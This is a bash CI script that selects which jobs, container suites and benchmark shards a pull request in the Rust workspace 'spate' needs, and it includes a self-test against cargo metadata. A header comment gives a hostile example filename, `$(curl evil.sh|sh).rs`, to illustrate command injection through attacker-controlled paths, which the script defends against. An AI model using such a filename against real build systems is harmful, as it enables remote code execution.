#!/usr/bin/env bash
#
# Decide which CI jobs a change actually needs, and write the answers to
# $GITHUB_OUTPUT.
#
# Why this is a script and not `on: paths:` or a filter action:
#
#   * A workflow skipped by `on: paths:` never reports its checks at all, and a
#     required check that never reports blocks the pull request forever. A
#     skipped *job* reports success. So the workflow must always run and the
#     filtering must happen per job — which `on: paths:` cannot express.
#     `on: paths:` also has a silent false negative: past 3,000 changed files it
#     may skip the workflow outright.
#
#   * The container-suite selection below is a reverse-dependency closure over
#     the crate graph. No filter action can express that; it is not a glob.
#
#   * It keeps the pull-request path free of third-party actions. Nothing here
#     runs code we do not own.
#
# Classification is an ignore-list, not an allow-list: anything not recognised
# as documentation counts as code. An allow-list fails *open* — a new source
# directory silently stops being tested, and nothing tells you. This shape fails
# closed, which is the error worth having.
#
# Usage:
#   scripts/ci-changes.sh              # emit outputs (reads env, see below)
#   scripts/ci-changes.sh --self-test  # verify the container map against cargo
#
# Environment:
#   EVENT_NAME  github.event_name
#   BASE_SHA    github.event.pull_request.base.sha  (pull_request only)
#   HEAD_SHA    github.event.pull_request.head.sha  (pull_request only)
#   PR_AUTHOR   github.event.pull_request.user.login  (NOT github.actor, which
#               is whoever last triggered the run and changes on a re-run)
#
# Filenames are attacker-controlled — a branch may legally contain a file called
# `$(curl evil.sh|sh).rs`. Every path here is handled as data: read into a
# variable, matched with bash pattern matching, never eval'd and never
# interpolated into a command line.
#
# What this script cannot defend against: a `pull_request` run executes the pull
# request's *own* copy of it, so a change here narrows the CI of the very change
# proposing it. That is inherent to `pull_request` — the alternative,
# `pull_request_target`, runs the base copy but hands a writable token to a job
# alongside untrusted code, which is a far worse trade. The same property
# applies to scripts/attribution.sh and to the workflow files themselves, and
# the compensating control is the same in all three cases: `.github/` and
# `scripts/` are CODEOWNERS paths, and reviewing what a diff does to CI is part
# of reviewing the diff. `--self-test` checks the container map, not this
# classification path.

set -euo pipefail

# Workspace packages that own `#[ignore]`d container tests. Everything else in
# the workspace has no container suite to run. `--self-test` derives this same
# set from the source tree and fails if the two disagree.
CONTAINER_PKGS="spate spate-kafka spate-clickhouse spate-s3 spate-coordination"

# Reverse-dependency closure: given a changed crate, which container suites can
# its change possibly break? Derived from the path dependencies in each
# crates/*/Cargo.toml — `--self-test` checks this against `cargo metadata`, so
# it cannot drift silently.
#
#   spate-core         is depended on by every crate
#   spate-test         is a dev-dependency of avro, json, kafka, clickhouse, s3, spate
#                    (note: NOT coordination, which uses its own `testing` feature)
#   spate-coordination is depended on by s3 and the facade
#   the connectors   are optional dependencies of the facade only
#
# Note this answers "can it break", not "does it exercise". The facade's own
# container tests drive Kafka and ClickHouse, so a change confined to
# `crates/spate-s3` still boots those via `-p spate` even though no facade test
# touches S3. Keeping the honest closure costs those boots; narrowing it by hand
# would buy them back at the price of a table `cargo metadata` can no longer
# verify. The closure wins — but do not describe this as running "nothing else".
container_suites_for() {
    case "$1" in
        spate-core) echo "$CONTAINER_PKGS" ;;
        spate-test) echo "spate spate-kafka spate-clickhouse spate-s3" ;;
        spate-coordination) echo "spate spate-coordination spate-s3" ;;
        spate-s3) echo "spate spate-s3" ;;
        spate-kafka) echo "spate spate-kafka" ;;
        spate-clickhouse) echo "spate spate-clickhouse" ;;
        # spate-json reaches spate-s3 as a dev-dependency: the object-store
        # framing bench frames with `NdjsonFramer` rather than a local copy,
        # so a change to the framer can break spate-s3's suite.
        spate-json) echo "spate spate-s3" ;;
        # spate-datagen reaches the facade twice: as an optional dependency
        # behind the `datagen` feature, and as a dev-dependency. Either edge is
        # enough to break the facade's container suite.
        spate-datagen) echo "spate" ;;
        spate-avro | spate) echo "spate" ;;
        # The wall-clock benchmark harness. Spelled out rather than left to the
        # default arm, because it is the one member whose empty answer is a
        # judgement rather than an absence: crates dev-depend on it for their
        # `benches/*_wall.rs` targets, and a container suite is an `#[ignore]`d
        # test that cargo never builds a bench target for. The self-test's
        # traversal is given the same exclusion, or a single such dev-dependency
        # would make this table and the graph disagree.
        spate-bench) echo "" ;;
        *) echo "" ;;
    esac
}

# Every crate that has a gungraun bench, discovered rather than listed — the
# `ci: bench` label and the force-all events select all of them, and
# `bench_pkgs_for` below answers from the same set.
#
# Discovery is a subprocess and classification asks about every changed crate,
# so the answer is cached. The cache has to be filled from the parent shell:
# `bench_pkgs_for` is called inside a command substitution, and a subshell can
# read an inherited variable but cannot write one back. `discover_bench_pkgs`
# is therefore called explicitly before any run of per-crate selection — at the
# top of `--self-test` and before the classification loop. Forgetting that call
# costs a subprocess per changed crate; it does not change an answer.
bench_pkgs_discovered=""
bench_pkgs_discovery_done=0
discover_bench_pkgs() {
    if [[ "$bench_pkgs_discovery_done" == "0" ]]; then
        bench_pkgs_discovered=$(
            "$(git rev-parse --show-toplevel)/scripts/gungraun-benches.sh" |
                cut -d' ' -f1 | sort -u
        )
        bench_pkgs_discovery_done=1
    fi
}

all_bench_pkgs() {
    discover_bench_pkgs
    # Nothing rather than a blank line when the set is empty: callers append
    # this to a space-separated list.
    [[ -z "$bench_pkgs_discovered" ]] || printf '%s\n' "$bench_pkgs_discovered"
}

# Does $1 have a gungraun bench? The name is derived from a changed path and is
# therefore attacker-controlled, so it is compared as data: a quoted right-hand
# side in `[[ == ]]` is a literal string, where an unquoted one would be a glob
# and a crate directory named `spate-*` would match every benched crate.
has_gungraun_bench() {
    local pkg
    while IFS= read -r pkg; do
        [[ "$pkg" == "$1" ]] && return 0
    done < <(all_bench_pkgs)
    return 1
}

# Which crates' instruction-count benches should a change to $1 run without
# being asked? Derived from what the benches discover rather than tabulated, so
# a crate that gains a bench is measured by the pull request that adds it and
# nothing here needs editing:
#
#   spate-core             every benched crate. Every crate depends on it, and
#                          codegen is crate-global, so a change there can move a
#                          count in any of them. It selects them whether or not
#                          it owns a bench itself — the rule is about reach.
#   any other benched crate  itself.
#   a crate with no bench   nothing.
bench_pkgs_for() {
    case "$1" in
        spate-core) all_bench_pkgs ;;
        *) if has_gungraun_bench "$1"; then echo "$1"; fi ;;
    esac
}

# ---------------------------------------------------------------------------
# The compiled-feature arms, and the matrix built from them.
# ---------------------------------------------------------------------------
# An instruction count describes a build, and a cargo feature that swaps an
# implementation produces a different build of the same bench. The counter tier
# therefore fans out over (package, feature arm) rather than over packages, and
# this is the one place the second dimension is written down.
#
# It lives here rather than in a file of its own because this script already
# answers "which crates does this change measure"; the matrix is that question
# with a second axis. A separate file would be a third thing the apparatus list
# below has to know about and a third thing a pull request can forget to touch.
#
# Each line is `<label> [<cargo feature list>]`:
#
#   label          names the arm in the report, the job name and the artifact
#                  name. `default` is the label for the unmodified build
#                  everywhere — it is not a cargo feature name, because not
#                  every package here declares a `default` key and cargo
#                  rejects `--features default` when one is absent.
#   feature list   what reaches `--features`, verbatim. Absent means the
#                  package's default features and no `--features` flag at all.
#
# The table is written rather than derived, and that is the honest shape: a
# crate's feature keys are not its performance arms. Most of them are optional
# column types or transport knobs no bench executes, and measuring the powerset
# would be exponentially many shards for one real question. An arm earns a
# shard by changing the code under the benches. `--self-test` holds the table
# to `cargo metadata` — an arm naming a feature its package does not declare
# fails the gate rather than burning a shard on `error: the package … does not
# contain this feature`.
feature_arms_for() {
    case "$1" in
        # `simd` replaces the byte-slice-to-value decoder behind the backend
        # seam, so the two arms are one set of benches over two
        # implementations — which is the comparison the seam exists for, and
        # the reason the axis is worth a matrix at all.
        spate-json) printf '%s\n' "default" "simd simd" ;;
        *) printf '%s\n' "default" ;;
    esac
}

# The selected packages crossed with their arms, as a JSON array that
# `fromJSON` hands straight to `strategy.matrix.include`.
#
# Built by string concatenation rather than with jq, borrowing the idiom from
# `gungraun-benches.sh --pkgs-json` — not its source, which derives from
# *unfiltered* discovery and would measure every crate on every pull request.
# Concatenating raw values into JSON is only safe because `--self-test`
# checks both halves of every object against a character class — package names
# against `[A-Za-z0-9_.-]+` and arm labels against `[A-Za-z0-9_.,-]+` — so no
# quote, backslash or control character can reach the document, and nothing
# that GitHub refuses in an artifact name can reach one. The package half
# matters as much as the label: it is a directory name under `crates/`, which
# a branch chooses, not a value this file does.
bench_shards_json() {
    local pkg label feats out="[" first=1
    for pkg in $1; do
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            [[ "$first" -eq 1 ]] || out+=","
            out+="{\"package\":\"$pkg\",\"arm\":\"$label\",\"cargo_features\":\"$feats\"}"
            first=0
        done < <(feature_arms_for "$pkg")
    done
    printf '%s]\n' "$out"
}

# ---------------------------------------------------------------------------
# Self-test: assert the table above still matches the real dependency graph.
# Runs in the `deny` job, which already has a toolchain. `cargo metadata
# --no-deps` reads manifests only and does not resolve the registry.
#
# Both the crate list and the container-package set are derived, never named
# here. An earlier version hard-coded the crate list on both sides of the
# comparison, which meant `cargo metadata` was only ever consulted about crates
# the table already knew about — so adding a whole new connector crate left the
# guard green while its container suite ran nowhere.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Label overrides.
# ---------------------------------------------------------------------------
# `ci: docker`, `ci: loom` and `ci: bench` force a suite on for a pull request
# whose changed paths would not have selected it.
#
# They can only add. `apply_ci_labels` appends to the list it was handed and
# never assigns over it, so its result is a superset of its input by
# construction; `--self-test` asserts that. Keep it that way — the classifier
# fails closed on purpose, and an override able to clear a selection would make
# it fail open.
#
# Removing a label turns nothing off; it stops adding, and the path-derived
# baseline stands.
apply_ci_labels() {
    local labels=",${1:-},"
    local suites="$2"
    if [[ "$labels" == *",ci: docker,"* ]]; then
        suites="$suites $CONTAINER_PKGS"
    fi
    echo "$suites"
}

ci_label_wants_loom() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: loom,"* ]]
}

# The instruction-count benches. Selected by path below as well; the label is
# for the change whose effect on the hot path the paths cannot see — a
# dependency swap, or a refactor that moves code between crates.
ci_label_wants_bench() {
    local labels=",${1:-},"
    [[ "$labels" == *",ci: bench,"* ]]
}

if [[ "${1:-}" == "--self-test" ]]; then
    repo_root=$(git rev-parse --show-toplevel)

    # Every case asserts that what comes out still contains everything that went
    # in. `spate-kafka` stands in for "the paths already selected something", so
    # an override that replaced rather than appended is caught here.
    for labels in "" "ci: docker" "ci: loom" "ci: bench" "ci: docker,ci: loom" \
        "ci: bench,ci: docker" "crate: spate-s3,ci: docker" "area: ci"; do
        for before in "" "spate-kafka" "$CONTAINER_PKGS"; do
            after=$(apply_ci_labels "$labels" "$before")
            for pkg in $before; do
                if [[ " $after " != *" $pkg "* ]]; then
                    echo "::error::apply_ci_labels dropped '$pkg' (labels='$labels', before='$before')."
                    echo "Label overrides must only ever add suites; see the note above the function."
                    exit 1
                fi
            done
        done
    done

    # The docker label also has to do something: the guard above would pass on a
    # function that ignored its input entirely.
    if [[ " $(apply_ci_labels "ci: docker" "") " != *" spate-kafka "* ]]; then
        echo "::error::'ci: docker' no longer forces the container suites on."
        exit 1
    fi
    # Every predicate must recognise exactly its own label, and no other. The
    # labels share a prefix, so a pattern that lost one of its comma anchors
    # would match a neighbour and quietly widen what a label turns on.
    if ! ci_label_wants_loom "ci: loom" ||
        ci_label_wants_loom "ci: docker" ||
        ci_label_wants_loom "ci: bench"; then
        echo "::error::ci_label_wants_loom no longer recognises exactly the loom label."
        exit 1
    fi
    if ! ci_label_wants_bench "ci: bench" ||
        ci_label_wants_bench "ci: docker" ||
        ci_label_wants_bench "ci: loom" ||
        ci_label_wants_bench ""; then
        echo "::error::ci_label_wants_bench no longer recognises exactly the bench label."
        exit 1
    fi

    # Additivity, for an output that is a boolean rather than a set: `bench` is
    # selected by paths OR label, so the only way the label could ever subtract
    # is by ceasing to match once a second label arrives. Both orderings, since
    # a pull request carries its labels in whatever order they were applied.
    for other in "ci: docker" "ci: loom" "crate: spate-s3" "area: ci"; do
        if ! ci_label_wants_bench "ci: bench,$other" ||
            ! ci_label_wants_bench "$other,ci: bench"; then
            echo "::error::'ci: bench' stopped matching alongside '$other'."
            exit 1
        fi
    done

    # Which crates actually own container tests, according to the source tree?
    derived_pkgs=""
    for dir in "$repo_root"/crates/*/; do
        if grep -rqE '#\[ignore' "$dir" --include='*.rs' 2>/dev/null; then
            derived_pkgs="$derived_pkgs $(basename "$dir")"
        fi
    done
    want=$(echo "$CONTAINER_PKGS" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    got=$(echo "$derived_pkgs" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
    if [[ "$want" != "$got" ]]; then
        echo "::error::CONTAINER_PKGS no longer matches the crates carrying #[ignore]d tests."
        echo "  declared: $want"
        echo "  in tree:  $got"
        echo "Update CONTAINER_PKGS in scripts/ci-changes.sh."
        exit 1
    fi

    metadata=$(cargo metadata --no-deps --format-version 1)

    # The crate list comes from cargo, so a new workspace member is compared
    # like any other and an empty row in the table shows up as a mismatch.
    crates=$(echo "$metadata" | python3 -c \
        'import json,sys; print("\n".join(sorted(p["name"] for p in json.load(sys.stdin)["packages"])))')

    expected=$(
        while IFS= read -r crate; do
            [[ -z "$crate" ]] && continue
            sorted=$(container_suites_for "$crate" | tr ' ' '\n' | grep -v '^$' | sort | tr '\n' ' ')
            printf '%s\t%s\n' "$crate" "${sorted% }"
        done <<<"$crates"
    )

    # The Python below is quoted with single quotes on purpose: it must reach
    # the interpreter verbatim, with no shell expansion of its `$` or backticks.
    # shellcheck disable=SC2016
    actual=$(echo "$metadata" | CONTAINER="$CONTAINER_PKGS" python3 -c '
import json, os, sys

CONTAINER = set(os.environ["CONTAINER"].split())
meta = json.load(sys.stdin)
names = {p["name"] for p in meta["packages"]}

# Forward edges, normal + dev, restricted to workspace-internal packages.
# Self-edges are the `testing`-feature dev-dependencies and carry no
# information about which other crate a change can reach.
#
# Edges *into* the wall-clock benchmark harness are dropped for the reason
# stated beside its row in container_suites_for(): a crate dev-depends on it for
# a bench target, and cargo builds no bench target for a container suite. Left
# in, one such dev-dependency would make the harness look as though it could
# break every suite its dependents can reach.
HARNESS = "spate-bench"
deps = {
    p["name"]: {d["name"] for d in p["dependencies"]
                if d["name"] in names and d["name"] != p["name"]
                and d["name"] != HARNESS}
    for p in meta["packages"]
}

def dependents(target):
    """Every package that transitively depends on target, plus target itself."""
    seen, frontier = {target}, [target]
    while frontier:
        cur = frontier.pop()
        for pkg, ds in deps.items():
            if cur in ds and pkg not in seen:
                seen.add(pkg)
                frontier.append(pkg)
    return seen

for crate in sorted(names):
    suites = " ".join(sorted(dependents(crate) & CONTAINER))
    print("{}\t{}".format(crate, suites))
')
    if [[ "$expected" != "$actual" ]]; then
        echo "::error::container_suites_for() no longer matches the crate graph."
        echo "Update the table in scripts/ci-changes.sh. Table says (<) vs cargo metadata (>):"
        diff <(echo "$expected") <(echo "$actual") || true
        exit 1
    fi
    # Bench selection is derived from discovery, which makes "everything
    # selected has a bench" true by construction and therefore worth nothing as
    # an assertion. What is checked instead is the shape of the three rules —
    # each of them a claim this file and DEVELOPING.md both make in prose, and
    # none of them guaranteed by the derivation alone.
    discover_bench_pkgs
    discovered=$(all_bench_pkgs)
    all_pkgs=$(all_bench_pkgs | tr '\n' ' ')
    all_pkgs="${all_pkgs% }"

    # First, because every assertion below is about a discovered set: an empty
    # one would satisfy most of them vacuously while no pull request was
    # measured by path at all.
    if [[ -z "$all_pkgs" ]]; then
        echo "::error::no gungraun bench was discovered; nothing would be measured by path."
        echo "Check scripts/gungraun-benches.sh and the benches/*_gungraun.rs naming convention."
        exit 1
    fi

    # spate-core reaches every count, so it selects every benched crate.
    core_pkgs=$(bench_pkgs_for spate-core | tr '\n' ' ')
    core_pkgs="${core_pkgs% }"
    if [[ "$core_pkgs" != "$all_pkgs" ]]; then
        echo "::error::bench_pkgs_for(spate-core) selects '$core_pkgs', not every benched crate."
        echo "Crates with benches: $all_pkgs"
        exit 1
    fi

    # Every other benched crate selects exactly itself — not the whole set,
    # which would put every crate's valgrind runs on every pull request.
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        selected=$(bench_pkgs_for "$crate" | tr '\n' ' ')
        if [[ "${selected% }" != "$crate" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects '${selected% }', not just itself."
            exit 1
        fi
    done <<<"$discovered"

    # And a crate with no bench selects nothing, so an ordinary change to one
    # does not pay for a measurement that would report on code it did not
    # touch. Checked against the tree, and against a name that is in no tree at
    # all — the `*` arm has to answer both with silence.
    #
    # spate-core is exempt, and not as a convenience: its rule is about what a
    # change to it can reach, not about what it owns, so it selects every
    # benched crate whether or not it has one of its own. Without the exemption
    # this loop would fail a tree where spate-core's bench had been deleted, and
    # blame the wrong rule for it.
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        if [[ -n "$(bench_pkgs_for "$crate")" ]]; then
            echo "::error::bench_pkgs_for('$crate') selects something, but '$crate' has no bench."
            exit 1
        fi
    done
    if [[ -n "$(bench_pkgs_for __no_such_crate__)" ]]; then
        echo "::error::bench_pkgs_for() selects something for a crate that does not exist."
        exit 1
    fi
    # A crate name reaches here from a changed path, and a branch may legally
    # contain a directory called `crates/spate-*/`. Matched as data it selects
    # nothing; matched as a pattern it would select every benched crate.
    if [[ -n "$(bench_pkgs_for 'spate-*')" ]]; then
        echo "::error::bench_pkgs_for() treats a crate name as a glob, not as data."
        exit 1
    fi

    # ------------------------------------------------------------------
    # The feature-arm table and the matrix built from it.
    #
    # The table is the one hand-written thing in the selection path, and each
    # check below catches a mistake that would otherwise surface as a burnt
    # shard, a corrupt matrix, or two rows in the report that cannot be told
    # apart.
    # ------------------------------------------------------------------
    arm_failed=0

    # Every feature key cargo knows about, per package. `default` is in this
    # map only for packages that declare one, which is exactly why the arm
    # *label* `default` is not passed to `--features`.
    feature_map=$(mktemp)
    echo "$metadata" | python3 -c '
import json, sys
for p in json.load(sys.stdin)["packages"]:
    for f in sorted(p["features"]):
        print("{}\t{}".format(p["name"], f))
' >"$feature_map"

    multi_arm=0
    while IFS= read -r crate; do
        [[ -n "$crate" ]] || continue
        # The package name is concatenated into the matrix JSON and into an
        # artifact name exactly as the arm label is, and it is *not* a value
        # this file chooses — it comes from a directory name under `crates/`,
        # which a branch controls. Checked here so the concatenation below is
        # safe by assertion rather than by cargo's naming rules happening to
        # be narrower than JSON's.
        if [[ ! "$crate" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            echo "::error::package name '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
            arm_failed=1
        fi
        arms=$(feature_arms_for "$crate")
        if [[ -z "$arms" ]]; then
            echo "::error::feature_arms_for('$crate') names no arm; a benched crate needs at least the default one."
            arm_failed=1
            continue
        fi
        arm_count=0
        default_arms=0
        seen_labels=""
        while read -r label feats; do
            [[ -n "$label" ]] || continue
            arm_count=$((arm_count + 1))
            # The label is concatenated into JSON and into an artifact name,
            # neither of which is escaped. Constraining it here is what makes
            # that concatenation safe rather than lucky.
            if [[ ! "$label" =~ ^[A-Za-z0-9_.,-]+$ ]]; then
                echo "::error::arm label '$label' on '$crate' carries a character that cannot go unescaped into the matrix JSON or an artifact name."
                arm_failed=1
            fi
            if [[ " $seen_labels " == *" $label "* ]]; then
                echo "::error::'$crate' declares the arm label '$label' twice; the two shards would stamp themselves identically and their rows could not be told apart."
                arm_failed=1
            fi
            seen_labels="$seen_labels $label"
            if [[ -z "$feats" ]]; then
                default_arms=$((default_arms + 1))
            else
                IFS=',' read -ra arm_feats <<<"$feats"
                for arm_feat in "${arm_feats[@]}"; do
                    if ! grep -qxF "$crate"$'\t'"$arm_feat" "$feature_map"; then
                        echo "::error::'$crate' has no feature '$arm_feat', but the arm table names it."
                        echo "Cargo would fail the shard with 'the package does not contain this feature'."
                        arm_failed=1
                    fi
                done
            fi
        done <<<"$arms"
        # Exactly one arm builds with no `--features` flag. Two of them would
        # be the same build measured twice under two labels; none of them
        # would leave the unmodified crate unmeasured.
        if [[ "$default_arms" -ne 1 ]]; then
            echo "::error::'$crate' declares $default_arms arm(s) with no feature list; exactly one (the default build) is required."
            arm_failed=1
        fi
        [[ "$arm_count" -le 1 ]] || multi_arm=1
    done <<<"$discovered"
    rm -f "$feature_map"

    # The axis has to be load-bearing somewhere. If every crate is measured
    # under one arm, the matrix has grown a dimension of size one everywhere
    # and the second build the whole shape exists for is not happening —
    # which is a green run measuring less than it claims, the failure this
    # tier keeps having.
    if [[ "$multi_arm" -eq 0 ]]; then
        echo "::error::no benched crate is measured under more than one feature arm."
        echo "The (package, arm) matrix has no second arm anywhere; see feature_arms_for()."
        arm_failed=1
    fi

    # The emitted document, checked as a document: `fromJSON` in ci.yml turns
    # a malformed one into a workflow-level error with no job to attribute it
    # to, and a duplicated (package, arm) into two shards racing for one
    # artifact name.
    if ! SHARDS="$(bench_shards_json "$all_pkgs")" python3 -c '
import json, os, sys

rows = json.loads(os.environ["SHARDS"])
if not rows:
    sys.exit("the matrix is empty")
for row in rows:
    if set(row) != {"package", "arm", "cargo_features"}:
        sys.exit("unexpected keys in {!r}".format(row))
keys = [(r["package"], r["arm"]) for r in rows]
if len(set(keys)) != len(keys):
    sys.exit("duplicate (package, arm) in {!r}".format(keys))
'; then
        echo "::error::the emitted bench matrix is not the shape ci.yml's strategy.matrix.include reads."
        arm_failed=1
    fi
    [[ "$arm_failed" == "0" ]] || exit 1

    # What each path arm selects. The checks above cannot see this: they test
    # the selection functions, and the arms are what consult them. Every row
    # here is a rule stated in prose somewhere — in the comments below or in
    # DEVELOPING.md — so a rule that stops holding fails here instead of going
    # quietly false in two documents at once.
    path_case_failed=0
    #
    # `$2` is still a package list, and the expectation is the matrix that
    # list crosses to. The arm table is not what these cases test — the checks
    # above own it — so reusing it to build the expectation keeps each case
    # readable as "which crates does this path select", which is the rule each
    # one states.
    # Classify a synthetic path list, leaving the child's outputs in $1.
    #
    # Shared by the assertions below rather than written into each of them: they
    # differ only in which key they read, and a second copy of this spawn is a
    # second place for the `env -u` guards to drift out of step.
    #
    # A subprocess, because classification runs at the bottom of this file
    # rather than in a function. Read the answers from the child's own
    # `GITHUB_OUTPUT` rather than its stdout: the classifier `tee`s to both, so
    # stdout carries every line twice when the variable is unset. Giving it a
    # temporary file also keeps synthetic answers out of the calling job's real
    # output. `PR_LABELS` and `EVENT_NAME` are unset so that neither a label nor
    # an event can decide what the arms should.
    classify_into() { # dest, paths...
        local dest=$1 list
        shift
        list=$(mktemp)
        printf '%s\0' "$@" >"$list"
        env -u PR_LABELS -u EVENT_NAME GITHUB_OUTPUT="$dest" \
            "$0" --classify-paths "$list" >/dev/null
        rm -f "$list"
    }

    check_paths() {
        local want_bench="$1" want_pkgs="$2" desc="$3"
        shift 3
        local out got_bench got_pkgs
        want_pkgs=$(bench_shards_json "$want_pkgs")
        out=$(mktemp)
        classify_into "$out" "$@"
        got_bench=$(sed -n 's/^bench=//p' "$out")
        got_pkgs=$(sed -n 's/^bench-shards=//p' "$out")
        rm -f "$out"
        if [[ "$got_bench" != "$want_bench" || "$got_pkgs" != "$want_pkgs" ]]; then
            echo "::error::$desc: expected bench=$want_bench bench-shards='$want_pkgs',"
            echo "got bench=$got_bench bench-shards='$got_pkgs' for: $*"
            path_case_failed=1
        fi
    }

    # The sample crates are derived, not named: naming one would put this file
    # back in the path of every pull request that adds or removes a bench,
    # which is the coupling the derivation exists to remove. Expectations stay
    # exact — what varies is which crate stands for each rule, not what the arm
    # is allowed to answer.
    benched_a="" benched_b="" unbenched=""
    while IFS= read -r crate; do
        [[ -n "$crate" && "$crate" != "spate-core" ]] || continue
        if [[ -z "$benched_a" ]]; then
            benched_a="$crate"
        elif [[ -z "$benched_b" ]]; then
            benched_b="$crate"
        fi
    done <<<"$discovered"
    for dir in "$repo_root"/crates/*/; do
        crate=$(basename "$dir")
        # Exempt for the same reason as the loop above: spate-core selects every
        # benched crate whether or not it owns one, so it cannot stand for the
        # crate that selects nothing.
        [[ "$crate" != "spate-core" ]] || continue
        has_gungraun_bench "$crate" && continue
        unbenched="$crate"
        break
    done

    check_paths true "$all_pkgs" "the core crate selects every benched crate" \
        crates/spate-core/src/lib.rs
    if [[ -n "$benched_a" ]]; then
        check_paths true "$benched_a" "a benched crate selects itself" \
            "crates/$benched_a/src/lib.rs"
    fi
    if [[ -n "$benched_b" ]]; then
        # Discovery is sorted and so is the emitted list, so taking the first
        # two in order needs no second sort here.
        check_paths true "$benched_a $benched_b" "two benched crates select both" \
            "crates/$benched_a/src/lib.rs" "crates/$benched_b/src/lib.rs"
    fi
    if [[ -n "$unbenched" ]]; then
        check_paths false "" "a crate without a bench selects nothing" \
            "crates/$unbenched/src/lib.rs"
    fi
    check_paths false "" "docs select nothing" docs/METRICS.md
    # Every file that can change what the counter tier measures, in the same
    # order as the `case` arm it mirrors. A file added to one and not the other
    # silently stops forcing a full re-measurement, which is how a change to
    # the apparatus lands unmeasured.
    for apparatus in scripts/ci-changes.sh scripts/gungraun-benches.sh \
        scripts/gungraun-report.sh scripts/gungraun-collected-region.sh \
        .github/workflows/ci.yml .github/actions/setup-rust/action.yml; do
        check_paths true "$all_pkgs" "$apparatus selects every benched crate" \
            "$apparatus"
    done

    # The two coarse outputs, asserted together because the arm that decides
    # them decides both and the regression worth catching turns off exactly one.
    #
    # `site` is the transclusion rule: a page's Rust snippets are regions of a
    # file under `crates/`, so an edit there can change a rendered page, and an
    # arm that stops selecting the site lets a broken region reach the deployed
    # site with every job green.
    #
    # `rust` is here because nothing else in this file asserts it, and the
    # `crates/*` arm now has a body. An arm that sets `site` and then `continue`s
    # — plausible enough as "an example is only input to the docs" — turns off
    # clippy and the whole test suite for an examples-only pull request. The
    # bench cases above do not speak for that path: `spate` owns no gungraun
    # bench, so nothing there selects on it, and the general `crates/*` case is
    # only covered by them incidentally, under an error message about the bench
    # table rather than the arm actually broken.
    check_flags() { # want_rust, want_site, desc, paths...
        local want_rust="$1" want_site="$2" desc="$3"
        shift 3
        local out got_rust got_site
        out=$(mktemp)
        classify_into "$out" "$@"
        got_rust=$(sed -n 's/^rust=//p' "$out")
        got_site=$(sed -n 's/^site=//p' "$out")
        rm -f "$out"
        if [[ "$got_rust" != "$want_rust" || "$got_site" != "$want_site" ]]; then
            echo "::error::$desc: expected rust=$want_rust site=$want_site,"
            echo "got rust=$got_rust site=$got_site for: $*"
            path_case_failed=1
        fi
    }

    # Derived, not named. `classify_into` classifies a path list and never
    # stats a file, so a literal here keeps passing after the example it names
    # is renamed away — asserting nothing, and saying so to nobody. The
    # empty-set guard is the point: an all-derived assertion that can go
    # vacuous is the failure this file warns about in three other places.
    example_path="$(find crates/spate/examples -maxdepth 1 -name '*.rs' | sort | head -1)"
    if [[ -z "$example_path" ]]; then
        echo "::error::no example under crates/spate/examples; the case below asserts nothing."
        path_case_failed=1
    else
        check_flags true true "an example builds Rust and rebuilds the site" \
            "$example_path"
    fi
    check_flags true true "a crate source builds Rust and rebuilds the site" \
        crates/spate-core/src/lib.rs
    check_flags false true "a docs page rebuilds the site and needs no Rust build" \
        docs/METRICS.md
    check_flags false true "the site tree rebuilds the site and needs no Rust build" \
        website/docusaurus.config.ts
    check_flags true false "a bench source builds Rust and does not rebuild the site" \
        bench/src/lib.rs

    [[ "$path_case_failed" == "0" ]] || exit 1

    echo "container_suites_for() matches the crate graph, CONTAINER_PKGS matches the tree,"
    echo "the label overrides are additive, bench selection follows what the benches"
    echo "discover, every feature arm names a feature its package declares, and each"
    echo "path arm selects the crates it claims to."
    exit 0
fi

# ---------------------------------------------------------------------------
# Collect the changed paths.
# ---------------------------------------------------------------------------
force_all=0
changed_file=$(mktemp)
trap 'rm -f "$changed_file"' EXIT

# `--classify-paths FILE` classifies a NUL-separated list given on the command
# line instead of a diff, so `--self-test` can assert what each arm below
# selects. It is an argument rather than an environment variable deliberately:
# an exported variable could turn a real classification into a synthetic one by
# accident, and an argument cannot arrive that way. The sentinel is hyphenated
# so no webhook event name can collide with it — GitHub's are underscored.
mode="${EVENT_NAME:-}"
if [[ "${1:-}" == "--classify-paths" ]]; then
    if [[ -z "${2:-}" || ! -r "${2:-}" ]]; then
        echo "--classify-paths needs a readable file of NUL-separated paths" >&2
        exit 2
    fi
    cat "$2" >"$changed_file"
    mode=classify-paths
fi

case "$mode" in
classify-paths)
    # The list is already in place; skip the diff entirely.
    ;;
pull_request)
    # Against the *merge base*, not the base branch tip. `base.sha` is the tip,
    # so a two-dot diff also reports everything main has gained since this
    # branch last moved — on an active repository that is most of the time, and
    # the scoping quietly stops applying.
    #
    # `--no-renames` because rename detection prints only the destination path:
    # `git mv crates/spate-s3/src/foo.rs docs/foo.rs` would otherwise look like a
    # docs-only change while deleting compiled source. That is a fail-*open*,
    # which is the one failure mode this classifier is built to avoid.
    #
    # `-z` because `core.quotePath` defaults to true, so a non-ASCII path is
    # emitted C-quoted (`"docs/caf\303\251.mdx"`) and matches none of the
    # patterns below. NUL-separated output cannot survive a command
    # substitution, hence the temporary file.
    if ! merge_base=$(git merge-base "${BASE_SHA:-}" "${HEAD_SHA:-}" 2>/dev/null) ||
        [[ -z "$merge_base" ]]; then
        echo "note: no merge base for ${BASE_SHA:-?}..${HEAD_SHA:-?}; running everything."
        force_all=1
    elif ! git diff --no-ext-diff --no-textconv --name-only -z --no-renames \
        "$merge_base" "${HEAD_SHA}" >"$changed_file" 2>/dev/null; then
        echo "note: could not diff ${merge_base}..${HEAD_SHA}; running everything."
        force_all=1
    fi
    ;;
*)
    # push, merge_group, schedule, workflow_dispatch. A merge queue entry has no
    # pull-request diff to reason about, and a push to main is the last line of
    # defence. Both get the full suite; correctness beats minutes here.
    force_all=1
    ;;
esac

# ---------------------------------------------------------------------------
# Classify.
# ---------------------------------------------------------------------------
rust=false
site=false
bench=false
bench_pkgs=""
suites=""

